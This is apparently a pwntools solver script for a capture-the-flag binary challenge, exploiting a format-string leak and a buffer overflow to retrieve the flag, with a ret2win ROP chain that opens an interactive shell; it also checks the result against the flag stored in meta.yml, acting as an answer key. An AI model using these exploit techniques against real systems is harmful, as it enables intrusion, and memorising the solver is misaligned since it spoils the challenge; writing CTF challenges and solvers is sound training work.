#!/usr/bin/env python3
import argparse
import yaml
import logging
from pwn import *
from pathlib import Path


logger = logging.getLogger("secretary")

# Load the flag dynamically from the meta file
HERE = Path(__file__).parent
FLAG = yaml.safe_load(open(HERE / "meta.yml"))["flags"]


class Exploit:
    FLAG = 1  # used as a constant for determining exploit type
    SHELL = 2  # used as a constant for determining exploit type

    def __init__(self, sh=None, binary=None):
        self.sh = sh
        self.binary = binary

    def Get_shell(self, key: int):
        padding = 62
        ROP_Chain = [
            b"\x90" * padding,
            p32(self.binary.sym.Enter_Debug),
            b"\x90" * 4,
            p32(key),
        ]
        self.sh.sendlineafter("#>", b"".join(ROP_Chain))
        self.sh.interactive()

    def Leak_secret(self):
        self.sh.sendlineafter(b"#>", b"3")
        self.sh.sendlineafter(b": ", b"%s")
        self.sh.recvuntil(b": ")
        secret = self.sh.recvline().decode().strip()
        return secret

    def Get_flag_fstring(self):
        secret = self.Leak_secret()
        self.sh.sendlineafter(b":", secret)
        self.sh.sendlineafter(b": ", b"A" * 20 + p32(0xCAFEBABE))
        return self.sh.recvuntil(b"}\n")

    def Gen_Key(self):
        key = None
        for _ in range(0xFFF):
            sum_ = ((2 * (0xBEEF) ^ 0x16) * _) >> 0x10
            if sum_ == 1337:
                key = _
        return key


def solve(sh):
    binary = context.binary = ELF(str(HERE / "chal/chal"), checksec=False)
    exploit = Exploit(sh, binary)
    flag = exploit.Get_flag_fstring().decode()
    assert FLAG in flag, flag


def test(domain, port):
    sh = remote(domain, port)
    solve(sh)


if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    parser = argparse.ArgumentParser()
    parser.add_argument("domain", default="0.0.0.0", nargs="?")
    parser.add_argument("port", default=1337, type=int, nargs="?")
    parser.add_argument(
        "--flag", action="store_true", help="Exploit using format string method"
    )
    parser.add_argument("--shell", action="store_true", help="Exploit using Ret2win")
    parser.add_argument("-r", action="store_true")
    args = parser.parse_args()

    if args.r:
        test(args.domain, args.port)
    else:
        sh = process("./chal/chal")
        solve(sh)
